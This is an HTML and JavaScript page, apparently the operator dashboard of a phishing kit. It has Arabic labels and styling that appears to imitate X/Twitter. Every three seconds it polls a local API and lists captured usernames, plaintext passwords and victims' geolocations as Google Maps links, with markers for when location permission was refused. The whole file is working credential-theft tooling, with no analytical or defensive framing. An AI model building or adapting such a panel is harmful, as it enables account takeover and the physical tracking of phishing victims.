<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Admin Dashboard</title>
<style>
  body { background: #000; color: #e7e9ea; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; padding: 20px; margin: 0; }
  .container { max-width: 1000px; margin: 0 auto; }
  h1 { color: #1d9bf0; display: flex; align-items: center; gap: 10px; }
  .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid #333639; padding-bottom: 20px; }
  button { background: #eff3f4; color: #0f1419; border: none; padding: 10px 20px; border-radius: 9999px; font-weight: bold; cursor: pointer; font-size: 15px; transition: 0.2s; }
  button:hover { background: #d7dbdc; }
  table { width: 100%; border-collapse: collapse; margin-top: 10px; }
  th, td { border: 1px solid #333639; padding: 12px 16px; text-align: left; }
  th { background: #16181c; color: #71767b; font-weight: normal; }
  td { font-size: 15px; }
  .pass { color: #1d9bf0; font-family: monospace; font-size: 16px; letter-spacing: 1px; }
  .map-link { color: #00ba7c; text-decoration: none; font-weight: bold; }
  .map-link:hover { text-decoration: underline; }
  .empty { text-align: center; color: #71767b; padding: 40px; }
</style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>🛡️ Admin Dashboard</h1>
      <button onclick="fetchData()">تحديث الآن</button>
    </div>
    
    <p style="color:#71767b; font-size: 14px;">يتم التحديث تلقائياً كل 3 ثواني...</p>

    <table>
      <thead>
        <tr>
          <th>الوقت (Time)</th>
          <th>اسم المستخدم (Username)</th>
          <th>كلمة المرور (Password)</th>
          <th>الموقع (Location)</th>
        </tr>
      </thead>
      <tbody id="dataBody">
        <tr><td colspan="4" class="empty">جاري تحميل البيانات...</td></tr>
      </tbody>
    </table>
  </div>

  <script>
    async function fetchData() {
      try {
        const response = await fetch('/api/get_data');
        const data = await response.json();
        const tbody = document.getElementById('dataBody');

        if (data.length === 0) {
          tbody.innerHTML = '<tr><td colspan="4" class="empty">لا توجد تسجيلات دخول حتى الآن.</td></tr>';
          return;
        }

        tbody.innerHTML = data.reverse().map(item => {
          // إذا كان الموقع متوفر، ننشئ رابط جوجل ماب، وإلا نكتب غير متوفر
          let locHtml = 'غير متوفر';
          if (item.latitude && item.latitude !== 'مرفوض' && item.latitude !== 'غير مدعوم') {
              locHtml = `<a href="https://www.google.com/maps?q=${item.latitude},${item.longitude}" target="_blank" class="map-link">📍 عرض الموقع</a>`;
          } else if (item.latitude === 'مرفوض') {
              locHtml = '❌ رفض الإذن';
          }

          return `
          <tr>
            <td>${item.time || 'غير محدد'}</td>
            <td>${item.username}</td>
            <td class="pass">${item.password}</td>
            <td>${locHtml}</td>
          </tr>
        `}).join('');
      } catch (error) {
        console.error('Error fetching data:', error);
      }
    }

    fetchData();
    setInterval(fetchData, 3000);
  </script>
</body>
</html>
